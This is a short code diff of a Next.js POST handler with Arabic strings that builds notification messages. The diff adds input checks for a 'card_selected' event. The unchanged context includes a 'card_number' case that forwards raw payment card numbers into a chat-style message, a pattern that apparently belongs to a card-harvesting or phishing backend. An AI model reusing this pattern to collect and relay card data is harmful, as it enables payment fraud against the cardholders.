@@ -9,9 +9,12 @@ export async function POST(request: NextRequest) {
     let message = "";
     
     switch (type) {
-      case "card_selected":
-        message = `🆕 *اختيار بطاقة جديدة*\n📇 ${payload.cardName}`;
+      case "card_selected": {
+        const cardName = typeof payload?.cardName === "string" ? payload.cardName.slice(0, 120) : "بطاقة غير معروفة";
+        const cardId = typeof payload?.cardId === "string" ? payload.cardId.slice(0, 80) : "unknown";
+        message = `اختيار بطاقة جديدة\nالبطاقة: ${cardName}\nالمعرّف: ${cardId}`;
         break;
+      }
         
       case "card_number":
         message = `🔢 *رقم البطاقة*\n\`${payload.cardNumber}\``;
